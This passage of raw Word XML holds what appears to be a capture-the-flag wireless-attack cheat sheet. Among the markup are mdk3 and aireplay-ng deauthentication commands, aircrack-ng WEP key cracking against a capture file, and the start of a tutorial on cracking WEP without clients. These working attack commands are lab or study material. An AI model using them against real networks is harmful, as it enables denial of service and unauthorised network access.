          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="575666D3" w14:textId="5C134BDD" w:rsidR="00EB60F0" w:rsidRPr="00EB60F0" w:rsidRDefault="00FB3D55" w:rsidP="00EB60F0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="006A34C8" w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>copy</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="006A34C8" w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and paste output of above into notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280D9E23" w14:textId="77777777" w:rsidR="00AE04E9" w:rsidRDefault="00AE04E9" w:rsidP="008C666C">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A6D2A2" w14:textId="77777777" w:rsidR="00025A34" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EB37F7" w14:textId="77777777" w:rsidR="00025A34" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02CED188" w14:textId="77777777" w:rsidR="00025A34" w:rsidRPr="006C69A7" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C69A7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Create blacklist of APs to hit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> (see step 5.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5348F6DE" w14:textId="77777777" w:rsidR="00025A34" w:rsidRPr="00561527" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00561527">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>touch</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00561527">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /root/Desktop/blacklist.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31337FCA" w14:textId="77777777" w:rsidR="00025A34" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FBA2A66" w14:textId="77777777" w:rsidR="00025A34" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00561527">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>mdk3</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00561527">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">  wlan3mon d –b blacklist.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F93F81" w14:textId="77777777" w:rsidR="00025A34" w:rsidRPr="00561527" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C061765" w14:textId="77777777" w:rsidR="00025A34" w:rsidRDefault="00025A34" w:rsidP="00025A34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>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aireplay</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deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0 –e BSIDES –h </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>client_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Ctr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7EC70B" w14:textId="77777777" w:rsidR="00025A34" w:rsidRPr="008C666C" w:rsidRDefault="00025A34" w:rsidP="008C666C">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C766FCB" w14:textId="77DDC6E4" w:rsidR="00C94D2E" w:rsidRDefault="00025A34" w:rsidP="00C94D2E">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Make Fox my Bitch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AB8FF9" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12240387" w14:textId="77777777" w:rsidR="00025A34" w:rsidRDefault="00025A34" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EBEF308" w14:textId="30117647" w:rsidR="00807AA6" w:rsidRPr="00807AA6" w:rsidRDefault="006C69A7" w:rsidP="00807AA6">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INJECT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7E8738" w14:textId="77777777" w:rsidR="00807AA6" w:rsidRPr="00807AA6" w:rsidRDefault="00807AA6" w:rsidP="00807AA6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E43C582" w14:textId="13C87FD5" w:rsidR="00803B63" w:rsidRDefault="00803B63" w:rsidP="00803B63">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68FD0229" w14:textId="77777777" w:rsidR="00803B63" w:rsidRDefault="00803B63" w:rsidP="00803B63">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D48DB5A" w14:textId="77777777" w:rsidR="00803B63" w:rsidRDefault="00803B63" w:rsidP="000F33A6">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>WEP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F13DA37" w14:textId="77777777" w:rsidR="00803B63" w:rsidRDefault="000E0B50" w:rsidP="000F33A6">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0025290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00803B63" w:rsidRPr="0025290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00803B63" w:rsidRPr="0025290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00803B63" w:rsidRPr="0025290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0025290C" w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/root/Desktop/CTF</w:t>
      </w:r>
      <w:r w:rsidR="0025290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0025290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>capture.cap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="37A77DF8" w14:textId="77777777" w:rsidR="008919ED" w:rsidRDefault="008919ED" w:rsidP="00EB10B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F987507" w14:textId="77777777" w:rsidR="00EB10B7" w:rsidRDefault="00EB10B7" w:rsidP="003C5340">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</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-b 00:14:6C:7E:40:80 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/root/Desktop/CTF</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capture.cap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="06CE5088" w14:textId="77777777" w:rsidR="008919ED" w:rsidRDefault="008919ED" w:rsidP="00EB10B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33F433B8" w14:textId="77777777" w:rsidR="008919ED" w:rsidRPr="002D638E" w:rsidRDefault="008919ED" w:rsidP="003C5340">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="72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aircrack</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-K -b 00:14:6C:7E:40:80 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/root/Desktop/CTF</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capture.cap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3A70EA2B" w14:textId="77777777" w:rsidR="00EB10B7" w:rsidRPr="0025290C" w:rsidRDefault="00EB10B7" w:rsidP="00803B63">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DCE49F8" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Tutorial: How to crack WEP with no wireless clients</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF89CA3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="459E087C"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5AB84CD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6B68E577" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3237EEC2" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002A56B4"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airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CF4AF1" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="797AB77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73DC7D95"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Interface       Chipset         Driver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCAAFFE"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
    <w:p w14:paraId="36CE8EA6"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p>
    <w:p w14:paraId="2D433505"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wlan0mon</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r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> VAP (parent: wlan0) (monitor mode enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0655DBEF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26E30E8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confirm the interface is properly setup, enter “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB04AE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59371454"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lo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3113B734"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eth0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6813D1"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wlan0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
